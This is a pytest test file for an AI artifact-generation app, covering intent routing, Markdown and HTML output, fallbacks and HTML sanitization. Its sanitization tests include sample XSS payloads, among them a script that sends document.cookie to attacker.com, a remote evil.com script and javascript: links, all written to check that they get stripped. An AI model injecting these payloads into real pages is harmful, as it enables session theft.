"""
Artifact Generation, Routing, and Security Isolation Tests.
Verifies Markdown and HTML artifact creation, agent routing, malformed fence handling,
and defense-in-depth HTML sanitization.
"""

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from app.agent.router import intent_router
from app.skills.artifact_generator import ArtifactGeneratorSkill
from app.security.sanitizer import sanitize_html
from app.db.models import SessionModel, ArtifactModel

# --- 1. Routing Tests ---

def test_artifact_routing_markdown_and_html():
    # Markdown routing
    assert intent_router.classify_intent("Create a Markdown product strategy document from this discussion.") == "markdown_artifact"
    assert intent_router.classify_intent("Generate a markdown cheatsheet for cohort retention") == "markdown_artifact"
    assert intent_router.classify_intent("Draft a markdown rubric for user onboarding") == "markdown_artifact"

    # HTML routing
    assert intent_router.classify_intent("Create a landing page in HTML/CSS based on the discussion.") == "html_artifact"
    assert intent_router.classify_intent("Create a landing page based on this product strategy.") == "html_artifact"
    assert intent_router.classify_intent("Build an interactive dashboard for North Star metrics") == "html_artifact"
    assert intent_router.classify_intent("Generate an HTML growth metric component") == "html_artifact"

# --- 2. Artifact Skill Execution Tests ---

@pytest.mark.asyncio
async def test_markdown_artifact_generation(test_db: AsyncSession):
    # Setup test session
    session = SessionModel(title="Strategy Session")
    test_db.add(session)
    await test_db.commit()
    await test_db.refresh(session)

    skill = ArtifactGeneratorSkill()
    history = [
        {"role": "user", "content": "How should a PM improve cross-functional collaboration?"},
        {"role": "assistant", "content": "Shreyas Doshi advises writing crisp 1-pagers and meeting 1-on-1 with detractors."},
    ]

    result = await skill.execute(
        query="Create a Markdown product strategy document from this discussion.",
        history=history,
        db=test_db,
        session_id=session.id,
        provider_name="ollama",
    )

    assert result.has_artifact is True
    assert result.artifact_type == "markdown"
    assert result.artifact_id is not None
    assert "# " in result.artifact_content or "## " in result.artifact_content
    assert result.artifact_title != ""

    # Verify saved to database
    saved = await test_db.get(ArtifactModel, result.artifact_id)
    assert saved is not None
    assert saved.type == "markdown"
    assert saved.content == result.artifact_content


@pytest.mark.asyncio
async def test_html_artifact_generation_and_styling(test_db: AsyncSession):
    session = SessionModel(title="Landing Page Session")
    test_db.add(session)
    await test_db.commit()
    await test_db.refresh(session)

    skill = ArtifactGeneratorSkill()
    history = [
        {"role": "user", "content": "We discussed reverse trials and PLG onboarding."},
    ]

    result = await skill.execute(
        query="Create a landing page in HTML/CSS based on the discussion.",
        history=history,
        db=test_db,
        session_id=session.id,
        provider_name="ollama",
    )

    assert result.has_artifact is True
    assert result.artifact_type == "html"
    assert "<style>" in result.artifact_content.lower() or "style=" in result.artifact_content.lower()
    # Ensure no script tags exist in the generated HTML
    assert "<script" not in result.artifact_content.lower()

    # Verify database persistence
    saved = await test_db.get(ArtifactModel, result.artifact_id)
    assert saved is not None
    assert saved.type == "html"


@pytest.mark.asyncio
async def test_malformed_artifact_fallback_handling(test_db: AsyncSession):
    session = SessionModel(title="Fallback Session")
    test_db.add(session)
    await test_db.commit()
    await test_db.refresh(session)

    skill = ArtifactGeneratorSkill()
    # Call fallback generator directly to verify resilience
    md_fallback = skill._generate_fallback_artifact("markdown", "Strategy spec", [], [])
    assert "# Cross-Functional Product Strategy" in md_fallback
    assert "```markdown" in md_fallback
    assert "Deterministic Fallback Artifact" in md_fallback

    html_fallback = skill._generate_fallback_artifact("html", "Landing page", [], [])
    assert "<!DOCTYPE html>" in html_fallback
    assert "<style>" in html_fallback
    assert "```html" in html_fallback
    assert "fallback-banner" in html_fallback


@pytest.mark.asyncio
async def test_artifact_insufficient_evidence_refusal(test_db: AsyncSession):
    session = SessionModel(title="Unsupported Query Session")
    test_db.add(session)
    await test_db.commit()
    await test_db.refresh(session)

    skill = ArtifactGeneratorSkill()
    # Query with no podcast knowledge or citations
    result = await skill.execute(
        query="Create a Markdown product strategy document for iPhone 17 specifications.",
        history=[],
        db=test_db,
        session_id=session.id,
        provider_name="mock",
    )

    assert result.has_artifact is False
    assert result.metadata.get("status") == "insufficient_evidence"
    assert "Insufficient Evidence in Knowledge Base" in result.content
    assert result.citations == []


@pytest.mark.asyncio
async def test_artifact_fallback_preserves_citations_and_indicates_fallback(test_db: AsyncSession):
    session = SessionModel(title="Fallback Provider Session")
    test_db.add(session)
    await test_db.commit()
    await test_db.refresh(session)

    skill = ArtifactGeneratorSkill()
    history = [
        {"role": "user", "content": "How does Shreyas Doshi define high agency?"},
        {"role": "assistant", "content": "High agency is finding a way to make things happen regardless of circumstances."},
    ]

    # Force provider failure by registering a broken provider
    from app.providers.factory import provider_factory
    from app.providers.base import LLMProvider

    class FailingProvider(LLMProvider):
        async def generate(self, *args, **kwargs):
            raise RuntimeError("LLM connection timed out")
        async def is_available(self):
            return False
        async def get_models(self):
            return []

    provider_factory._providers["failing_test_provider"] = FailingProvider()

    result = await skill.execute(
        query="Create a Markdown product strategy document from this discussion.",
        history=history,
        db=test_db,
        session_id=session.id,
        provider_name="failing_test_provider",
    )

    assert result.has_artifact is True
    assert result.artifact_type == "markdown"
    assert result.metadata.get("fallback") is True
    assert "Deterministic Fallback Artifact" in result.artifact_content
    assert "LLM provider is currently unavailable" in result.content



# --- 3. Defense-in-Depth HTML Sanitization & Iframe Isolation Tests ---

def test_sanitization_removes_dangerous_scripts():
    malicious = """
    <div class="card">
        <h1>Dashboard</h1>
        <script>window.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
        <script src="https://evil.com/payload.js"></script>
        <p>Safe statistics</p>
    </div>
    """
    clean = sanitize_html(malicious)
    assert "<script" not in clean.lower()
    assert "attacker.com" not in clean
    assert "evil.com" not in clean
    assert "Safe statistics" in clean


def test_sanitization_removes_inline_event_handlers():
    malicious = """
    <div onmouseover="fetch('http://attacker.com')">
        <img src="avatar.png" onerror="alert(document.domain)" onload="exfiltrate()">
        <button onclick="stealToken()">Click</button>
    </div>
    """
    clean = sanitize_html(malicious)
    assert "onerror" not in clean.lower()
    assert "onload" not in clean.lower()
    assert "onclick" not in clean.lower()
    assert "onmouseover" not in clean.lower()
    assert "stealToken" not in clean


def test_sanitization_blocks_javascript_urls():
    malicious = """
    <div>
        <a href="javascript:alert('pwned')">Click to win</a>
        <a href="JAVASCRIPT:evil()">Another</a>
        <a href="https://legit.com/growth">Safe Link</a>
    </div>
    """
    clean = sanitize_html(malicious)
    assert "javascript:" not in clean.lower()
    assert "https://legit.com/growth" in clean
    assert 'target="_blank"' in clean
    assert 'rel="noopener noreferrer nofollow"' in clean


def test_iframe_isolation_assumptions():
    # Verify sandbox attribute expectations
    sandbox_attr = ""
    # An empty sandbox attribute strictly enforces:
    # 1. Scripts are disabled (no allow-scripts)
    # 2. Same-origin access blocked (no allow-same-origin)
    # 3. Top navigation blocked (no allow-top-navigation)
    # 4. Form submission blocked (no allow-forms)
    assert "allow-scripts" not in sandbox_attr
    assert "allow-same-origin" not in sandbox_attr
    assert "allow-top-navigation" not in sandbox_attr
